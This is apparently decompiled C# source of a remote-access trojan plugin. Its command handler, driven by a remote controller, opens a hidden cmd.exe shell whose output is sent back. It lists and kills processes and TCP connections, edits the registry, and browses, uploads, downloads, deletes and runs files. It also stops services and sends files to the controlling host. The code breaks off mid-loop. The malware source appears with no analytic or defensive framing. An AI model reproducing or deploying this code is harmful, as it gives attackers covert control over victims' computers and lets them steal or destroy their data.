using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using plg.My;

namespace plg
{
	// Token: 0x02000007 RID: 7
	public class A
	{
		// Token: 0x06000011 RID: 17 RVA: 0x00002288 File Offset: 0x00000488
		public A()
		{
			this.CN = true;
			this.Y = "|'|'|";
			this.F = new Computer();
		}

		// Token: 0x06000012 RID: 18 RVA: 0x000022B0 File Offset: 0x000004B0
		public byte[] SB(ref string S)
		{
			return Encoding.Default.GetBytes(S);
		}

		// Token: 0x06000013 RID: 19 RVA: 0x000022CC File Offset: 0x000004CC
		public string BS(ref byte[] B)
		{
			return Encoding.Default.GetString(B);
		}

		// Token: 0x06000014 RID: 20 RVA: 0x000022E8 File Offset: 0x000004E8
		public string ENB(ref string s)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			return Convert.ToBase64String(bytes);
		}

		// Token: 0x06000015 RID: 21 RVA: 0x0000230C File Offset: 0x0000050C
		public string DEB(ref string s)
		{
			byte[] array = Convert.FromBase64String(s);
			return Encoding.UTF8.GetString(array);
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002330 File Offset: 0x00000530
		private void RS(object a, object e)
		{
			try
			{
				string text = "rs";
				string y = this.Y;
				string text2 = Conversions.ToString(NewLateBinding.LateGet(e, null, "Data", new object[0], null, null, null));
				string text3 = this.ENB(ref text2);
				NewLateBinding.LateSetComplex(e, null, "Data", new object[] { text2 }, null, null, true, false);
				this.Send(text + y + text3);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000017 RID: 23 RVA: 0x000023B4 File Offset: 0x000005B4
		private void ex()
		{
			try
			{
				this.Send("rsc");
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000018 RID: 24 RVA: 0x000023EC File Offset: 0x000005EC
		public void ind(byte[] b)
		{
			string[] array = Strings.Split(this.BS(ref b), this.Y, -1, CompareMethod.Binary);
			checked
			{
				try
				{
					string text = "";
					string text2 = array[1];
					if (Operators.CompareString(text2, "tcp", false) == 0)
					{
						string text3 = array[2];
						if (Operators.CompareString(text3, "~", false) == 0)
						{
							text = "tcp" + this.Y + "~" + this.Y;
							List<string> list = new List<string>();
							int num = 3;
							int num2 = array.Length - 1;
							for (int i = num; i <= num2; i++)
							{
								list.Add(array[i]);
							}
							foreach (A.MIB_TCPROW_OWNER_PID mib_TCPROW_OWNER_PID in this.GetAllTcpConnections())
							{
								string text4 = new IPEndPoint(long.Parse(Conversions.ToString(mib_TCPROW_OWNER_PID.LA)), 0).Address.ToString() + ":" + Conversions.ToString((uint)BitConverter.ToUInt16(new byte[] { mib_TCPROW_OWNER_PID.l2, mib_TCPROW_OWNER_PID.l1 }, 0));
								string text5 = new IPEndPoint(long.Parse(Conversions.ToString(mib_TCPROW_OWNER_PID.RA)), 0).Address.ToString() + ":" + Conversions.ToString((uint)BitConverter.ToUInt16(new byte[] { mib_TCPROW_OWNER_PID.R2, mib_TCPROW_OWNER_PID.R1 }, 0));
								if (list.Contains(text4 + text5))
								{
									list.Remove(text4 + text5);
								}
								text = string.Concat(new string[]
								{
									text,
									text4,
									",",
									text5,
									",",
									Conversions.ToString(mib_TCPROW_OWNER_PID.state),
									",",
									Process.GetProcessById(mib_TCPROW_OWNER_PID.P).ProcessName,
									"[",
									Conversions.ToString(mib_TCPROW_OWNER_PID.P),
									"]*"
								});
							}
							if (text.Length > 0)
							{
								text = text.Remove(text.Length - 1, 1);
								this.Send(text);
							}
							text = "tcp" + this.Y + "RM";
							if (list.Count > 0)
							{
								try
								{
									foreach (string text6 in list)
									{
										text = text + this.Y + text6;
									}
								}
								finally
								{
									
								}
							}
							this.Send(text);
						}
						else if (Operators.CompareString(text3, "!", false) == 0)
						{
                            foreach (A.MIB_TCPROW_OWNER_PID mib_TCPROW_OWNER_PID2 in this.GetAllTcpConnections())
                            {
                                string text7 = new IPEndPoint(long.Parse(Conversions.ToString(mib_TCPROW_OWNER_PID2.LA)), 0).Address.ToString() + ":" + Conversions.ToString((uint)BitConverter.ToUInt16(new byte[] { mib_TCPROW_OWNER_PID2.l2, mib_TCPROW_OWNER_PID2.l1 }, 0));
                                string text8 = new IPEndPoint(long.Parse(Conversions.ToString(mib_TCPROW_OWNER_PID2.RA)), 0).Address.ToString() + ":" + Conversions.ToString((uint)BitConverter.ToUInt16(new byte[] { mib_TCPROW_OWNER_PID2.R2, mib_TCPROW_OWNER_PID2.R1 }, 0));
                                int num3 = 3;
                                int num4 = array.Length - 1;
                                for (int l = num3; l <= num4; l++)
                                {
                                    string arrayItem = array[l];
                                    if (Operators.CompareString(arrayItem, text7 + text8, false) == 0)
                                    {
                                        try
                                        {
                                            A.MIB_TCPROW_OWNER_PID modifiedItem = mib_TCPROW_OWNER_PID2;
                                            modifiedItem.state = 12U;
                                            IntPtr intPtr = Marshal.AllocCoTaskMem(Marshal.SizeOf(mib_TCPROW_OWNER_PID2));
                                            Marshal.StructureToPtr(modifiedItem, intPtr, false);
                                            A.SetTcpEntry(intPtr);
                                        }
                                        catch (Exception ex)
                                        {
                                            this.Send(string.Concat(new string[] { "tcp", this.Y, "ER", this.Y, ex.Message }));
                                        }
                                    }
                                }
                            }

                        }
                    }
					else if (Operators.CompareString(text2, "proc", false) == 0)
					{
						string text9 = array[2];
						if (Operators.CompareString(text9, "~", false) == 0)
						{
							this.Send(string.Concat(new string[]
							{
								"proc",
								this.Y,
								"pid",
								this.Y,
								Conversions.ToString(Process.GetCurrentProcess().Id)
							}));
						}
						else if (Operators.CompareString(text9, "U", false) == 0)
						{
							List<int> list2 = new List<int>();
							int num5 = 3;
							int num6 = array.Length - 1;
							for (int m = num5; m <= num6; m++)
							{
								list2.Add(Conversions.ToInteger(array[m]));
							}
							text = "proc" + this.Y + "!" + this.Y;
							ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_Process");
							try
							{
								foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
								{
									ManagementObject managementObject = (ManagementObject)managementBaseObject;
									int num7 = Conversions.ToInteger(managementObject["ProcessId"]);
									if (list2.Contains(num7))
									{
										list2.Remove(num7);
									}
									else
									{
										string[] array2 = new string[2];
										array2[0] = "System";
										try
										{
											managementObject.InvokeMethod("getowner", array2);
										}
										catch (Exception ex2)
										{
										}
										text = Conversions.ToString(Operators.ConcatenateObject(text, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(managementObject["Name"], "[:]"), managementObject["ProcessId"]), "[:]"), managementObject["ExecutablePath"]), "[:]"), array2[0]), "[:]"), managementObject["CommandLine"]), "[::]")));
									}
								}
							}
							finally
							{
								
							}
							this.Send(text);
							text = "proc" + this.Y + "RM";
							if (list2.Count > 0)
							{
								try
								{
									foreach (int num8 in list2)
									{
										text = text + this.Y + Conversions.ToString(num8);
									}
								}
								finally
								{
									
								}
							}
							this.Send(text);
						}
						else if (Operators.CompareString(text9, "k", false) == 0)
						{
							int num9 = 3;
							int num10 = array.Length - 1;
							for (int n = num9; n <= num10; n++)
							{
								try
								{
									Process.GetProcessById(Conversions.ToInteger(array[n])).Kill();
								}
								catch (Exception ex3)
								{
									this.Send(string.Concat(new string[] { "proc", this.Y, "ER", this.Y, ex3.Message }));
								}
							}
						}
						else if (Operators.CompareString(text9, "kd", false) == 0)
						{
							int num11 = 3;
							int num12 = array.Length - 1;
							for (int num13 = num11; num13 <= num12; num13++)
							{
								try
								{
									string[] array3 = Strings.Split(array[num13], "::", -1, CompareMethod.Binary);
									Process processById = Process.GetProcessById(Conversions.ToInteger(array3[0]));
									processById.Kill();
									Thread.Sleep(2000);
									File.Delete(array3[1]);
									this.Send(string.Concat(new string[]
									{
										"proc",
										this.Y,
										"ER",
										this.Y,
										"Deleted ",
										array3[1]
									}));
								}
								catch (Exception ex4)
								{
									this.Send(string.Concat(new string[] { "proc", this.Y, "ER", this.Y, ex4.Message }));
								}
							}
						}
						else if (Operators.CompareString(text9, "re", false) == 0)
						{
							int num14 = 3;
							int num15 = array.Length - 1;
							for (int num16 = num14; num16 <= num15; num16++)
							{
								try
								{
									string[] array4 = Strings.Split(array[num16], "::", -1, CompareMethod.Binary);
									Process processById2 = Process.GetProcessById(Conversions.ToInteger(array4[0]));
									processById2.Kill();
									if (!File.Exists(array4[1]))
									{
										string[] array5 = array4;
										int num17 = 1;
										array5[num17] = array4[num17] + ".exe";
									}
									Process.Start(array4[1], array4[2]);
									this.Send(string.Concat(new string[]
									{
										"proc",
										this.Y,
										"ER",
										this.Y,
										"Started ",
										array4[1],
										" ",
										array4[2]
									}));
								}
								catch (Exception ex5)
								{
									this.Send(string.Concat(new string[] { "proc", this.Y, "ER", this.Y, ex5.Message }));
								}
							}
						}
					}
					else if (Operators.CompareString(text2, "rs", false) == 0)
					{
						string text10 = array[2];
						if (Operators.CompareString(text10, "~", false) == 0)
						{
							try
							{
								this.Pro.Kill();
							}
							catch (Exception ex6)
							{
							}
							this.Pro = new Process();
							this.Pro.StartInfo.RedirectStandardOutput = true;
							this.Pro.StartInfo.RedirectStandardInput = true;
							this.Pro.StartInfo.RedirectStandardError = true;
							this.Pro.StartInfo.FileName = "cmd.exe";
							this.Pro.OutputDataReceived += new DataReceivedEventHandler(this.RS);
							this.Pro.ErrorDataReceived += new DataReceivedEventHandler(this.RS);
							this.Pro.Exited += delegate(object a0, EventArgs a1)
							{
								this.ex();
							};
							this.Pro.StartInfo.UseShellExecute = false;
							this.Pro.StartInfo.CreateNoWindow = true;
							this.Pro.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
							this.Pro.EnableRaisingEvents = true;
							this.Send("rss");
							this.Pro.Start();
							this.Pro.BeginErrorReadLine();
							this.Pro.BeginOutputReadLine();
						}
						else if (Operators.CompareString(text10, "!", false) == 0)
						{
							this.Pro.StandardInput.WriteLine(this.DEB(ref array[3]));
						}
						else if (Operators.CompareString(text10, "@", false) == 0)
						{
							try
							{
								this.Pro.Kill();
							}
							catch (Exception ex7)
							{
							}
							this.Pro = null;
						}
					}
					else
					{
						if (Operators.CompareString(text2, "RG", false) == 0)
						{
							try
							{
								string text11 = array[2];
								if (Operators.CompareString(text11, "~", false) == 0)
								{
									RegistryKey registryKey = this.GetKey(array[3], false);
									text = string.Concat(new string[]
									{
										"RG",
										this.Y,
										"~",
										this.Y,
										array[3],
										this.Y
									});
									string text12 = "";
									foreach (string text13 in registryKey.GetSubKeyNames())
									{
										if (!text13.Contains("\\"))
										{
											text12 = text12 + text13 + "[,]";
										}
									}
									foreach (string text14 in registryKey.GetValueNames())
									{
										text12 = string.Concat(new string[]
										{
											text12,
											text14,
											"[;]",
											registryKey.GetValueKind(text14).ToString(),
											"[;]",
											registryKey.GetValue(text14, "").ToString(),
											"[,]"
										});
									}
									this.Send(text + text12);
									return;
								}
								if (Operators.CompareString(text11, "!", false) == 0)
								{
									RegistryKey registryKey = this.GetKey(array[3], true);
									registryKey.SetValue(array[4], array[5], (RegistryValueKind)Conversions.ToInteger(array[6]));
									return;
								}
								if (Operators.CompareString(text11, "@", false) == 0)
								{
									RegistryKey registryKey = this.GetKey(array[3], true);
									registryKey.DeleteValue(array[4], false);
									return;
								}
								if (Operators.CompareString(text11, "#", false) == 0)
								{
									RegistryKey registryKey = this.GetKey(array[3], true);
									registryKey.CreateSubKey(array[4]);
									return;
								}
								if (Operators.CompareString(text11, "$", false) == 0)
								{
									RegistryKey registryKey = this.GetKey(array[3], true);
									registryKey.DeleteSubKeyTree(array[4]);
								}
								return;
							}
							catch (Exception ex8)
							{
								string[] array6 = new string[5];
								array6[0] = "RG";
								array6[1] = this.Y;
								array6[2] = "ER";
								array6[3] = this.Y;
								string[] array7 = array6;
								int num20 = 4;
								string text15 = ex8.Message;
								array7[num20] = this.ENB(ref text15);
								this.Send(string.Concat(array6));
								return;
							}
						}
						if (Operators.CompareString(text2, "fm", false) == 0)
						{
							string text16 = array[2];
							if (Operators.CompareString(text16, "cp", false) == 0)
							{
								string text17 = this.DEB(ref array[3]);
								string[] array8 = Strings.Split(this.DEB(ref array[4]), "*", -1, CompareMethod.Binary);
								foreach (string text18 in array8)
								{
									try
									{
										File.Copy(text18, text17 + Strings.Split(text18, "\\", -1, CompareMethod.Binary)[Strings.Split(text18, "\\", -1, CompareMethod.Binary).Length - 1], true);
									}
									catch (Exception ex9)
									{
									}
								}
							}
							else if (Operators.CompareString(text16, "mv", false) == 0)
							{
								string text19 = this.DEB(ref array[3]);
								string[] array10 = Strings.Split(this.DEB(ref array[4]), "*", -1, CompareMethod.Binary);
								foreach (string text20 in array10)
								{
									try
									{
										File.Move(text20, text19 + Strings.Split(text20, "\\", -1, CompareMethod.Binary)[Strings.Split(text20, "\\", -1, CompareMethod.Binary).Length - 1]);
									}
									catch (Exception ex10)
									{
									}
								}
							}
							else if (Operators.CompareString(text16, "nd", false) == 0)
							{
								Directory.CreateDirectory(this.DEB(ref array[3]));
							}
							else if (Operators.CompareString(text16, "nf", false) == 0)
							{
								File.WriteAllText(this.DEB(ref array[3]), "");
							}
							else
							{
								if (Operators.CompareString(text16, "up", false) == 0)
								{
									int num23 = 0;
									string text21 = this.DEB(ref array[4]);
									string text22 = array[3];
									int num24 = Conversions.ToInteger(array[5]);
									if (File.Exists(text21))
									{
										File.Delete(text21);
									}
									TcpClient tcpClient = new TcpClient();
									tcpClient.Connect(this.H, this.P);
									tcpClient.Client.SendTimeout = -1;
									tcpClient.Client.ReceiveBufferSize = 1048576;
									FileStream fileStream = null;
									string text23 = string.Concat(new string[]
									{
										"get",
										this.Y,
										text22,
										this.Y,
										array[4]
									});
									string text15 = text23.Length.ToString() + "\0" + text23;
									byte[] array12 = this.SB(ref text15);
									tcpClient.Client.Send(array12, 0, array12.Length, SocketFlags.None);
									tcpClient.Client.Poll(-1, SelectMode.SelectRead);
									try
									{
										File.Delete(text21);
										fileStream = new FileStream(text21, FileMode.CreateNew);
										while (num23 != num24)
										{
											tcpClient.Client.Poll(-1, SelectMode.SelectRead);
											if (tcpClient.Client.Available <= 0)
											{
												break;
											}
											byte[] array13 = new byte[tcpClient.Client.Available - 1 + 1];
											int num25 = tcpClient.Client.Receive(array13, 0, array13.Length, SocketFlags.None);
											fileStream.Write(array13, 0, num25);
											fileStream.Flush();
											num23 += num25;
										}
									}
									catch (Exception ex11)
									{
									}
									try
									{
										fileStream.Close();
										fileStream.Dispose();
									}
									catch (Exception ex12)
									{
									}
									try
									{
										tcpClient.Close();
										return;
									}
									catch (Exception ex13)
									{
										return;
									}
								}
								if (Operators.CompareString(text16, "dw", false) == 0)
								{
									if (File.Exists(this.DEB(ref array[3])))
									{
										if (FileSystem.FileLen(this.DEB(ref array[3])) != 0L)
										{
											FileStream fileStream2 = new FileStream(this.DEB(ref array[3]), FileMode.Open, FileAccess.Read);
											try
											{
												TcpClient tcpClient2 = new TcpClient();
												tcpClient2.Connect(this.H, this.P);
												tcpClient2.Client.SendTimeout = -1;
												tcpClient2.Client.SendBufferSize = 524288;
												long num26 = FileSystem.FileLen(this.DEB(ref array[3]));
												string text24 = array[4];
												try
												{
													string text25 = string.Concat(new string[]
													{
														"post",
														this.Y,
														array[3],
														this.Y,
														Conversions.ToString(num26),
														this.Y,
														text24
													});
													string text15 = text25.Length.ToString() + "\0" + text25;
													byte[] array14 = this.SB(ref text15);
													tcpClient2.Client.Send(array14, 0, array14.Length, SocketFlags.None);
													tcpClient2.Client.Poll(-1, SelectMode.SelectRead);
													byte[] array15 = new byte[262145];
													tcpClient2.Client.Receive(array15, 0, tcpClient2.Client.Available, SocketFlags.None);
													long num27 = 0L;
													while (num27 != num26)
													{
														int num28 = fileStream2.Read(array15, 0, array15.Length);
														num27 += unchecked((long)num28);
														tcpClient2.Client.Poll(-1, SelectMode.SelectWrite);
														tcpClient2.Client.Send(array15, 0, num28, SocketFlags.None);
													}
													tcpClient2.Client.Poll(-1, SelectMode.SelectRead);
												}
												catch (Exception ex14)
												{
												}
												tcpClient2.Client.Close(-1);
											}
											catch (Exception ex15)
											{
											}
											fileStream2.Close();
										}
									}
								}
								else if (Operators.CompareString(text16, "rar", false) == 0)
								{
									string text26 = Interaction.Environ("programfiles") + "\\winrar\\rar.exe";
									while (!File.Exists(text26))
									{
										if (!text26.Contains("(x86)"))
										{
											this.Send(string.Concat(new string[]
											{
												"FM",
												this.Y,
												"ER",
												this.Y,
												array[2],
												this.Y,
												"WinRar IsNot Installed"
											}));
											return;
										}
										text26 = text26.Replace(" (x86)", "");
									}
									string text27 = this.DEB(ref array[3]);
									Process.Start(new ProcessStartInfo
									{
										FileName = text26,
										WorkingDirectory = this.DEB(ref array[4]),
										Arguments = this.DEB(ref array[5]),
										CreateNoWindow = true,
										WindowStyle = ProcessWindowStyle.Hidden
									}).WaitForExit();
									this.Send(string.Concat(new string[]
									{
										"FM",
										this.Y,
										"ER",
										this.Y,
										array[2],
										this.Y,
										"Created ",
										this.DEB(ref array[3])
									}));
								}
								else if (Operators.CompareString(text16, "unrar", false) == 0)
								{
									string text28 = Interaction.Environ("programfiles") + "\\winrar\\rar.exe";
									while (!File.Exists(text28))
									{
										if (!text28.Contains("(x86)"))
										{
											this.Send(string.Concat(new string[]
											{
												"FM",
												this.Y,
												"ER",
												this.Y,
												array[2],
												this.Y,
												"WinRar IsNot Installed"
											}));
											return;
										}
										text28 = text28.Replace(" (x86)", "");
									}
									FileInfo fileInfo = new FileInfo(this.DEB(ref array[3]));
									Process.Start(new ProcessStartInfo
									{
										FileName = text28,
										WorkingDirectory = fileInfo.Directory.FullName,
										Arguments = string.Concat(new string[]
										{
											"x -y\"",
											fileInfo.Name,
											"\" *.* \"UnRAR_",
											fileInfo.Name.Remove(fileInfo.Name.Length - fileInfo.Extension.Length - 1, fileInfo.Extension.Length),
											"\\\""
										}),
										CreateNoWindow = true,
										WindowStyle = ProcessWindowStyle.Hidden
									}).WaitForExit();
									this.Send(string.Concat(new string[]
									{
										"FM",
										this.Y,
										"ER",
										this.Y,
										array[2],
										this.Y,
										"UnRAR_",
										fileInfo.Name.Remove(fileInfo.Name.Length - fileInfo.Extension.Length - 1, fileInfo.Extension.Length)
									}));
								}
								else
								{
									if (Operators.CompareString(text16, "fl", false) == 0)
									{
										try
										{
											MyProject.Computer.Network.DownloadFile(this.DEB(ref array[3]), this.DEB(ref array[4]));
											this.Send(string.Concat(new string[]
											{
												"FM",
												this.Y,
												"ER",
												this.Y,
												array[2],
												this.Y,
												"Downloaded ",
												this.DEB(ref array[3]),
												" To ",
												this.DEB(ref array[4])
											}));
											return;
										}
										catch (Exception ex16)
										{
											this.Send(string.Concat(new string[]
											{
												"FM",
												this.Y,
												"ER",
												this.Y,
												array[2],
												this.Y,
												ex16.Message
											}));
											return;
										}
									}
									if (Operators.CompareString(text16, "~", false) == 0)
									{
										lock (this)
										{
											text = "FM" + this.Y + "!";
											foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
											{
												try
												{
													if (driveInfo.IsReady)
													{
														string text29 = text;
														string y = this.Y;
														string text15 = driveInfo.Name + "*" + driveInfo.DriveType.ToString();
														text = text29 + y + this.ENB(ref text15);
													}
												}
												catch (Exception ex17)
												{
												}
											}
											try
											{
												string text30 = text;
												string y2 = this.Y;
												string text15 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\*";
												text = text30 + y2 + this.ENB(ref text15);
												string text31 = text;
												string y3 = this.Y;
												text15 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\*";
												text = text31 + y3 + this.ENB(ref text15);
												string text32 = text;
												string y4 = this.Y;
												text15 = Interaction.Environ("userprofile") + "\\*";
												text = text32 + y4 + this.ENB(ref text15);
												string text33 = text;
												string y5 = this.Y;
												text15 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\*";
												text = text33 + y5 + this.ENB(ref text15);
												string text34 = text;
												string y6 = this.Y;
												text15 = Interaction.Environ("programfiles") + "\\*";
												text = text34 + y6 + this.ENB(ref text15);
												if (Interaction.Environ("programdata") != null)
												{
													string text35 = text;
													string y7 = this.Y;
													text15 = Interaction.Environ("programdata") + "\\*";
													text = text35 + y7 + this.ENB(ref text15);
												}
												string text36 = text;
												string y8 = this.Y;
												text15 = Interaction.Environ("windir") + "\\*";
												text = text36 + y8 + this.ENB(ref text15);
												string text37 = text;
												string y9 = this.Y;
												text15 = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\*";
												text = text37 + y9 + this.ENB(ref text15);
												string text38 = text;
												string y10 = this.Y;
												text15 = Interaction.Environ("appdata") + "\\*";
												text = text38 + y10 + this.ENB(ref text15);
												string text39 = text;
												string y11 = this.Y;
												text15 = Interaction.Environ("temp") + "\\*";
												text = text39 + y11 + this.ENB(ref text15);
											}
											catch (Exception ex18)
											{
											}
											this.Send(text);
											return;
										}
									}
									if (Operators.CompareString(text16, "!", false) == 0)
									{
										lock (this)
										{
											text = string.Concat(new string[]
											{
												"FM",
												this.Y,
												"@",
												this.Y,
												array[3],
												this.Y
											});
											foreach (string text40 in Directory.GetDirectories(this.DEB(ref array[3])))
											{
												string text41 = text;
												string text15 = new DirectoryInfo(text40).Name;
												text = text41 + this.ENB(ref text15) + "*";
											}
											this.Send(text);
											return;
										}
									}
									if (Operators.CompareString(text16, "@", false) == 0)
									{
										lock (this)
										{
											text = string.Concat(new string[]
											{
												"FM",
												this.Y,
												"#",
												this.Y,
												array[3],
												this.Y
											});
											int num31 = 0;
											foreach (string text42 in Directory.GetFiles(this.DEB(ref array[3])))
											{
												FileInfo fileInfo2 = new FileInfo(text42);
												string text43 = "";
												if (num31 < 60)
												{
													try
													{
														string text44 = fileInfo2.Extension.ToLower();
														if (Operators.CompareString(text44, ".jpg", false) != 0)
														{
															if (Operators.CompareString(text44, ".gif", false) != 0)
															{
																if (Operators.CompareString(text44, ".png", false) != 0)
																{
																	if (Operators.CompareString(text44, ".tiff", false) != 0)
																	{
																		if (Operators.CompareString(text44, ".bmp", false) != 0)
																		{
																			if (Operators.CompareString(text44, ".jpeg", false) != 0)
																			{
																				goto IL_1CE9;
																			}
																		}
																	}
																}
															}
														}
														Bitmap bitmap = new Bitmap(text42);
														MemoryStream memoryStream = new MemoryStream();
														bitmap.GetThumbnailImage(24, 24, null, (IntPtr)0).Save(memoryStream, ImageFormat.Jpeg);
														text43 = Convert.ToBase64String(memoryStream.ToArray());
														num31++;
														IL_1CE9:;
													}
													catch (Exception ex19)
													{
													}
												}
												if (Operators.CompareString(text43, "", false) == 0)
												{
													string text45 = text;
													string text15 = fileInfo2.Name + "*" + Conversions.ToString(fileInfo2.Length);
													text = text45 + this.ENB(ref text15) + "*";
												}
												else
												{
													string text46 = text;
													string text15 = string.Concat(new string[]
													{
														fileInfo2.Name,
														"*",
														Conversions.ToString(fileInfo2.Length),
														"*",
														text43
													});
													text = text46 + this.ENB(ref text15) + "*";
												}
											}
											this.Send(text);
											return;
										}
									}
									if (Operators.CompareString(text16, "#", false) == 0)
									{
										text = string.Concat(new string[]
										{
											"FM",
											this.Y,
											"$",
											this.Y,
											array[3],
											this.Y
										});
										try
										{
											MemoryStream memoryStream2 = new MemoryStream();
											IntPtr intPtr2 = IntPtr.Zero;
											Image thumbnailImage = Image.FromFile(this.DEB(ref array[3])).GetThumbnailImage(Conversions.ToInteger(array[4]), Conversions.ToInteger(array[5]), null, intPtr2);
											thumbnailImage.Save(memoryStream2, ImageFormat.Jpeg);
											thumbnailImage.Dispose();
											b = memoryStream2.ToArray();
											memoryStream2.Dispose();
											memoryStream2 = new MemoryStream();
											memoryStream2.Write(this.SB(ref text), 0, this.SB(ref text).Length);
											memoryStream2.Write(b, 0, b.Length);
											this.Send(memoryStream2.ToArray());
											memoryStream2.Dispose();
											return;
										}
										catch (Exception ex20)
										{
											return;
										}
									}
									if (Operators.CompareString(text16, "rn", false) == 0)
									{
										int num33 = 3;
										int num34 = array.Length - 1;
										for (int num35 = num33; num35 <= num34; num35++)
										{
											try
											{
												Process.Start(this.DEB(ref array[num35]));
											}
											catch (Exception ex21)
											{
												this.Send(string.Concat(new string[]
												{
													"FM",
													this.Y,
													"ER",
													this.Y,
													array[2],
													this.Y,
													"Cant Start >> ",
													this.DEB(ref array[num35])
												}));
											}
										}
									}
									else if (Operators.CompareString(text16, "dl", false) == 0)
									{
										int num36 = 3;
										int num37 = array.Length - 1;
										for (int num38 = num36; num38 <= num37; num38++)
										{
											string[] array16 = Strings.Split(this.DEB(ref array[num38]), "*", -1, CompareMethod.Binary);
											try
											{
												if (Operators.CompareString(array16[1], "!", false) == 0)
												{
													Directory.Delete(array16[0], true);
												}
												else
												{
													File.Delete(array16[0]);
												}
												this.Send(string.Concat(new string[]
												{
													"FM",
													this.Y,
													"dl",
													this.Y,
													array[num38]
												}));
											}
											catch (Exception ex22)
											{
												this.Send(string.Concat(new string[]
												{
													"FM",
													this.Y,
													"ER",
													this.Y,
													array[2],
													this.Y,
													"Cant Delete >> ",
													array16[0]
												}));
											}
										}
									}
									else if (Operators.CompareString(text16, "rd", false) == 0)
									{
										int num39 = 3;
										int num40 = array.Length - 1;
										for (int num41 = num39; num41 <= num40; num41++)
										{
											try
											{
												if (FileSystem.FileLen(this.DEB(ref array[num41])) <= 20480L)
												{
													string[] array6 = new string[7];
													array6[0] = "FM";
													array6[1] = this.Y;
													array6[2] = "%";
													array6[3] = this.Y;
													array6[4] = array[num41];
													array6[5] = this.Y;
													string[] array17 = array6;
													int num42 = 6;
													string text15 = File.ReadAllText(this.DEB(ref array[num41]));
													array17[num42] = this.ENB(ref text15);
													text = string.Concat(array6);
													this.Send(text);
												}
											}
											catch (Exception ex23)
											{
												this.Send(string.Concat(new string[]
												{
													"FM",
													this.Y,
													"ER",
													this.Y,
													array[2],
													this.Y,
													"Cant Open >> ",
													this.DEB(ref array[num41])
												}));
											}
										}
									}
									else
									{
										if (Operators.CompareString(text16, "wr", false) == 0)
										{
											try
											{
												File.WriteAllText(this.DEB(ref array[3]), this.DEB(ref array[4]));
												return;
											}
											catch (Exception ex24)
											{
												this.Send(string.Concat(new string[]
												{
													"FM",
													this.Y,
													"ER",
													this.Y,
													array[2],
													this.Y,
													"Cant Write >> ",
													this.DEB(ref array[3])
												}));
												return;
											}
										}
										if (Operators.CompareString(text16, "nm", false) == 0)
										{
											int num43 = 3;
											int num44 = array.Length - 1;
											int num45 = num43;
											while (num45 <= num44)
											{
												string[] array18 = Strings.Split(this.DEB(ref array[num45]), "*", -1, CompareMethod.Binary);
												if (Operators.CompareString(array18[2], "!", false) == 0)
												{
													DirectoryInfo directoryInfo = new DirectoryInfo(array18[0]);
													try
													{
														directoryInfo.MoveTo(directoryInfo.Parent.FullName + "\\" + array18[1]);
														this.Send(string.Concat(new string[]
														{
															"FM",
															this.Y,
															"nm",
															this.Y,
															array[num45]
														}));
														goto IL_24FA;
													}
													catch (Exception ex25)
													{
														this.Send(string.Concat(new string[]
														{
															"FM",
															this.Y,
															"ER",
															this.Y,
															array[2],
															this.Y,
															"Cant Rename >>'",
															directoryInfo.Name,
															"' To '",
															array18[1],
															"'"
														}));
														goto IL_24FA;
													}
													goto IL_23FA;
												}
												goto IL_23FA;
												IL_24FA:
												num45++;
												continue;
												IL_23FA:
												FileInfo fileInfo3 = new FileInfo(array18[0]);
												try
												{
													fileInfo3.MoveTo(fileInfo3.Directory.FullName + "\\" + array18[1]);
													this.Send(string.Concat(new string[]
													{
														"FM",
														this.Y,
														"nm",
														this.Y,
														array[num45]
													}));
												}
												catch (Exception ex26)
												{
													this.Send(string.Concat(new string[]
													{
														"FM",
														this.Y,
														"ER",
														this.Y,
														array[2],
														this.Y,
														"Cant Rename >>'",
														fileInfo3.Name,
														"' To '",
														array18[1],
														"'"
													}));
												}
												goto IL_24FA;
											}
										}
									}
								}
							}
						}
						else if (Operators.CompareString(text2, "srv", false) == 0)
						{
							string text47 = array[2];
							if (Operators.CompareString(text47, "~", false) == 0)
							{
								text = "srv" + this.Y + "~";
								foreach (ServiceController serviceController in ServiceController.GetServices())
								{
									text = string.Concat(new string[]
									{
										text,
										this.Y,
										serviceController.ServiceName,
										"[,]",
										serviceController.DisplayName,
										"[,]",
										serviceController.ServiceType.ToString(),
										"[,]",
										serviceController.Status.ToString(),
										"[,]",
										serviceController.CanStop.ToString()
									});
								}
								this.Send(text);
							}
							else if (Operators.CompareString(text47, "!", false) == 0)
							{
								foreach (ServiceController serviceController2 in ServiceController.GetServices())
								{
									int num48 = 3;
									int num49 = array.Length - 1;
									for (int num50 = num48; num50 <= num49; num50++)
									{
										if (Operators.CompareString(serviceController2.ServiceName.ToLower(), array[num50].ToLower(), false) == 0)
										{
											try
											{
												serviceController2.Stop();
												this.Send(string.Concat(new string[]
												{
													"FM",
													this.Y,
													"ER",
													this.Y,
													array[2],
													this.Y,
													"Stopped ",
													serviceController2.DisplayName
												}));
												break;
											}
											catch (Exception ex27)
											{
												this.Send(string.Concat(new string[]
												{
													"FM",
													this.Y,
													"ER",
													this.Y,
													array[2],
													this.Y,
													ex27.Message
												}));
												break;
											}
										}
									}
								}
							}
							else if (Operators.CompareString(text47, "@", false) == 0)
							{
								foreach (ServiceController serviceController3 in ServiceController.GetServices())
								{
									int num52 = 3;
									int num53 = array.Length - 1;
									for (int num54 = num52; num54 <= num53; num54++)
									{
